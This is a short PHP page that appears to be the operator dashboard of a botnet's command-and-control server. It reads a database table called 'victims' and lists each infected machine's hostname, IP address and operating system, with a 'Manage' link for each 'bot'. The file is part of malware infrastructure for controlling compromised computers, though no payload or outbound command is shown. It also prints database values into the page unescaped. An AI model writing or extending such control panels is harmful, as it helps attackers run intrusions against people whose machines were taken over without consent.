<?php
include 'session.php';
include 'conn.php';
 ?>




 <html>
 <style>
th, td{
  border: 1px solid;
}
 </style>
 <center>
<table>
<tr>
<th>Hostname</th>
<th>Ip Address</th>
<th>Operating System</th>
<th>Action</th>
</tr>
<?php

$botQuery = $mysql->query("select * from victims");

while($row = $botQuery->fetch_assoc())
{
$hostname = $row["hostname"];
$os = $row["os"];
$ip = $row["ip"];
$action = "<a href='/manage.php?bot=" . $hostname . "'>Manage</a>";

echo "<td>".$hostname."</td>";
echo "<td>".$ip."</td>";
echo "<td>".$os."</td>";
echo "<td>".$action."</td>";

echo "</tr>";
}
 ?>


<table>
</center>


 </html>
